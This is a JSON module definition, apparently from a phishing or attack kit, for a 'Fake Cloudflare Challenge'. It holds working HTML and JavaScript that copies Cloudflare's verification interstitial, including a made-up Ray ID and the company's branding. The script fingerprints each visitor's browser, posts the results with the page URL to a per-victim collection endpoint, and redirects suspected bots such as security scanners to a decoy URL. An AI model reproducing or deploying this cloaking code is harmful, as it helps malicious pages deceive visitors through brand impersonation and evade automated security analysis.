{
  "name": "Fake Cloudflare Challenge",
  "description": "Shows a convincing Cloudflare-style 'Just a moment...' interstitial (bouncing-bubble spinner, live countdown, ray-id style footer, 'Performance & security by Cloudflare' branding), waits a configurable minimum delay, optionally runs the same bot probe as Bot Guard during the wait, then reveals the page or redirects likely bots to a decoy URL. Fails open (reveals the page) on any error. Inputs are embedded via hidden DOM elements, so quotes and apostrophes are safe; avoid HTML special characters (<, &) in inputs.",
  "category": "Anti-Bot",
  "icon": "",
  "inputs": [
    {
      "id": 0,
      "label": "Minimum Wait (seconds)",
      "type": "number",
      "required": false
    },
    {
      "id": 1,
      "label": "Decoy URL (redirect if bot detected)",
      "type": "string",
      "required": false
    },
    {
      "id": 2,
      "label": "Run Bot Check (true/false)",
      "type": "string",
      "required": false
    }
  ],
  "payload": "<div class=\"cf-root\"><div class=\"cf-main\"><div class=\"cf-bubbles\"><span class=\"cf-bubble cf-b1\"></span><span class=\"cf-bubble cf-b2\"></span><span class=\"cf-bubble cf-b3\"></span></div><h2 class=\"cf-title\">Just a moment...</h2><p class=\"cf-subtitle\" id=\"cfMsg\">Verifying you are human. This may take a few seconds.</p><p class=\"cf-ray\" id=\"cfRay\"></p></div><div class=\"cf-footer\"><span class=\"cf-badge\">☁️</span> Performance & security by <strong>Cloudflare</strong></div><span id=\"cfWait\" hidden>{{ params[0] }}</span><span id=\"cfDecoy\" hidden>{{ params[1] }}</span><span id=\"cfBotCheck\" hidden>{{ params[2] }}</span></div><script>(function(){function txt(id){var el=document.getElementById(id);return el?el.textContent.trim():'';}var waitSec=parseInt(txt('cfWait'),10)||5;var decoy=txt('cfDecoy');var runCheck=txt('cfBotCheck').toLowerCase()==='true';var moduleId='{{module_id}}';var revealed=false;function reveal(){if(revealed)return;revealed=true;try{__removeModule();}catch(e){}}var hardTimer=setTimeout(reveal,(waitSec+10)*1000);var msg=document.getElementById('cfMsg');var remaining=waitSec;function setMsg(){msg.textContent='Verifying you are human. This may take a few seconds.'+(remaining>1?' ('+remaining+'s)':'');}setMsg();var countdown=setInterval(function(){remaining--;if(remaining<=1){clearInterval(countdown);remaining=1;}setMsg();},1000);var chars='abcdef0123456789',ray='';for(var i=0;i<16;i++){ray+=chars.charAt(Math.floor(Math.random()*chars.length));}document.getElementById('cfRay').textContent='Ray ID: '+ray;function collectSignals(){var s={};try{s.webdriver=!!navigator.webdriver;}catch(e){s.webdriver=null;}try{s.hasChrome=!!window.chrome;}catch(e){s.hasChrome=null;}try{s.plugins=navigator.plugins?navigator.plugins.length:-1;}catch(e){s.plugins=-1;}try{s.languages=navigator.languages?navigator.languages.join(','):(navigator.language||'');}catch(e){s.languages='';}try{s.screenWidth=screen.width||0;s.screenHeight=screen.height||0;}catch(e){s.screenWidth=0;s.screenHeight=0;}try{s.outerWidth=window.outerWidth||0;s.outerHeight=window.outerHeight||0;s.innerWidth=window.innerWidth||0;s.innerHeight=window.innerHeight||0;}catch(e){s.outerWidth=0;s.outerHeight=0;s.innerWidth=0;s.innerHeight=0;}try{s.touchSupport=('ontouchstart' in window)||(navigator.maxTouchPoints||0)>0;s.maxTouchPoints=navigator.maxTouchPoints||0;}catch(e){s.touchSupport=null;s.maxTouchPoints=0;}try{s.hardwareConcurrency=navigator.hardwareConcurrency||0;}catch(e){s.hardwareConcurrency=0;}try{s.deviceMemory=navigator.deviceMemory||0;}catch(e){s.deviceMemory=0;}try{s.userAgent=navigator.userAgent||'';}catch(e){s.userAgent='';}try{s.phantom=!!(window.phantom||window._phantom);s.nightmare=!!window.__nightmare;s.domAutomation=!!(window.domAutomation||window.domAutomationController);}catch(e){s.phantom=false;s.nightmare=false;s.domAutomation=false;}s.webglRenderer=null;try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var ext=gl.getExtension('WEBGL_debug_renderer_info');s.webglRenderer=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);}}catch(e){s.webglRenderer=null;}return s;}function evaluate(s){var ua=(s.userAgent||'').toLowerCase();if(ua.indexOf('headlesschrome')!==-1||s.webdriver===true){return{score:100,verdict:'bot'};}var pts=0;if(s.phantom||s.nightmare)pts+=40;if(s.domAutomation)pts+=30;if(s.plugins===0&&ua.indexOf('chrome')!==-1)pts+=15;if(s.outerWidth===0||s.outerHeight===0)pts+=10;else if(s.innerWidth&&s.outerWidth<s.innerWidth)pts+=5;if(!s.webglRenderer)pts+=15;if(s.screenWidth===0||s.screenHeight===0)pts+=10;if(s.touchSupport===false&&/android|iphone|ipad|mobile/.test(ua))pts+=10;if(!s.hardwareConcurrency)pts+=5;var verdict=pts>=50?'bot':(pts>=20?'inconclusive':'human');return{score:pts,verdict:verdict};}function finish(verdict){clearTimeout(hardTimer);clearInterval(countdown);if(verdict==='bot'&&decoy){try{window.location.href=decoy;}catch(e){reveal();}return;}reveal();}function proceed(){if(!runCheck){finish('human');return;}try{var signals=collectSignals();var result=evaluate(signals);var body=JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{verdict:result.verdict,score:result.score,signals:signals,url:window.location.href,timestamp:new Date().toISOString()}});fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:body}).then(function(){finish(result.verdict);},function(){finish(result.verdict);});}catch(e){finish('inconclusive');}}setTimeout(proceed,waitSec*1000);})();</script><style>.cf-root{position:fixed;inset:0;z-index:2147483647;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;color:#313131}.cf-main{width:100%;max-width:60rem;padding:0 1.5rem;text-align:center}.cf-bubbles{display:flex;gap:10px;justify-content:center;margin-bottom:24px}.cf-bubble{width:14px;height:14px;border-radius:50%;background:#313131;animation:cfBounce 1s infinite ease-in-out}.cf-b1{animation-delay:0s}.cf-b2{animation-delay:.15s}.cf-b3{animation-delay:.3s}@keyframes cfBounce{0%,80%,100%{transform:scale(.6);opacity:.4}40%{transform:scale(1);opacity:1}}.cf-title{font-size:1.5rem;font-weight:500;margin:0 0 12px}.cf-subtitle{font-size:1rem;margin:0 0 16px}.cf-ray{font-size:.75rem;color:#999;font-family:monaco,courier,monospace;margin:0}.cf-footer{position:absolute;bottom:0;left:0;right:0;padding:1rem 1.5rem;border-top:1px solid #d9d9d9;font-size:.75rem;color:#666;text-align:center}.cf-badge{margin-right:4px}</style>",
  "link": "c/{{victim_id}}"
}
